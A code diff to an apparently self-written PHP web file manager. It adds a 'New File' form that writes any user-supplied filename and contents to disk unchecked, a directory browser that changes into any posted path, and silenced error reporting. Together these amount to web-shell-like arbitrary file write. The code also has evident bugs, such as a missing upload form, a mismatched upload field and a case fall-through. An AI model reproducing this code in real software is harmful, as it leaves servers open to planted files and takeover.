@@ -1,4 +1,4 @@
-<?php session_start(); if(!isset($_GET['do'])) {header("location:?do=home");}?>
+<?php session_start(); error_reporting(0); if(!isset($_GET['do'])) {header("location:?do=home");}?>
 <!DOCTYPE html>
 <html>
   <head>
@@ -29,6 +29,7 @@ function actors()
   echo "<hr><center><div id=actors-band>";
   echo "&nbsp;&nbsp;&nbsp;&nbsp;[ <a href='?do=home' id=actors>Home</a> ]&nbsp;&nbsp;&nbsp;&nbsp;";
   echo "[ <a href='?do=upload' id=actors>Upload</a> ]&nbsp;&nbsp;&nbsp;&nbsp;";
+  echo "[ <a href='?do=newfile' id=actors>New File</a> ]&nbsp;&nbsp;&nbsp;&nbsp;";
   echo "[ <a href='?do=logout' id=actors>Logout</a> ]&nbsp;&nbsp;&nbsp;&nbsp;";
   echo "</div></center><hr>";
 }
@@ -41,23 +42,82 @@ function manager()
       break;
       case 'logout':
         logout();
+      case 'home':
+        home();
         break;
-
+      case 'newfile':
+        newfile();
+        break;
   }
+}
+function newfile()
+{
+  echo "<center><div><form action='' method=post id=nf>File Will Be Saved in - <i><b>".getcwd()."</b></i><br><br>File name : <input id=l1 placeholder=file.txt autofocus name=fname><br><br><span style='vertical-align:top;'>File Contents : </span><textarea name=fdata id=l2 rows=5 cols=40></textarea><br><br><input type=submit value='Make File' name=make></form></div></center>";
+  if(isset($_POST['make']))
+  {
+    $file = fopen($_POST['fname'],"w");
+    $data = $_POST['fdata'];
+    fwrite($file,$data);
+    fclose($file);
+  }
+}
+function home()
+{
+  $cwd = getcwd();
+  if(isset($_POST['GO']))
+  {
+    $cwd = $_POST['cwd'];
+    chdir($cwd);
+  }
+  echo "<center><div id=pwd><form method=post action=''>Present Working Directory : <input id=PWD name=cwd size=80 value='$cwd'><input type=submit name=GO value=Go></form></div></center>";
+  $files = scandir($cwd);
+  $l = 1;
+  echo "<center id=fn><table border=1><tr id=th><th>#</th><th>Name</th><th>Is Directory ?</th><th>Permissions</th><th>Action</th><tr>";
+  foreach ($files as $file) {
+    if($file[0]=="."){continue;}
+    if(is_dir($file))
+    {
+      echo "<tr><td>$l</td><td>$file</td><td>YES OPEN</td><td>".fileperms($file)."</td><td>NEW FILE DELETE</td></tr>";
+    }
+    else {
+      echo "<tr><td>$l</td><td>$file</td><td>NO</td><td>".fileperms($file)."</td><td>NEW FILE DELETE</td></tr>";
+    }
+    $l++;
+  }
+  echo "</table></center>";
 }
 function uploader()
 {
   echo "<center><div id=uploader-band>";
   $cwd = getcwd();
   $isw = is_writable($cwd) ? "YES" : "NO";
-  echo "<form action='' method=post style=margin-top:50px;margin-bottom:25px;>Current Upload Location : <b>$cwd</b><br>IS WRITABLE : <b>$isw</b><br><br><input type=file id=file name=file><input type=submit id=upfile name=upfile value=Upload></form>";
   if(isset($_POST['upfile']))
   {
-    if(!isset($_POST['file'])) {echo "ERROR : No File Selected";}
-    else
-    {
-      print_r($_POST['file']);
-    }
+    if(isset($_FILES['image'])){
+      $errors= array();
+      $file_name = $_FILES['image']['name'];
+      $file_size =$_FILES['image']['size'];
+      $file_tmp =$_FILES['image']['tmp_name'];
+      $file_type=$_FILES['image']['type'];
+      $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));
+
+      $expensions= array("jpeg","jpg","png");
+
+      if(in_array($file_ext,$expensions)=== false){
+         $errors[]="extension not allowed, please choose a JPEG or PNG file.";
+      }
+
+      if($file_size > 2097152){
+         $errors[]='File size must be excately 2 MB';
+      }
+
+      if(empty($errors)==true){
+         move_uploaded_file($file_tmp,"images/".$file_name);
+         echo "Success";
+      }else{
+         print_r($errors);
+      }
+   }
   }
   echo "</div></center>";
 }
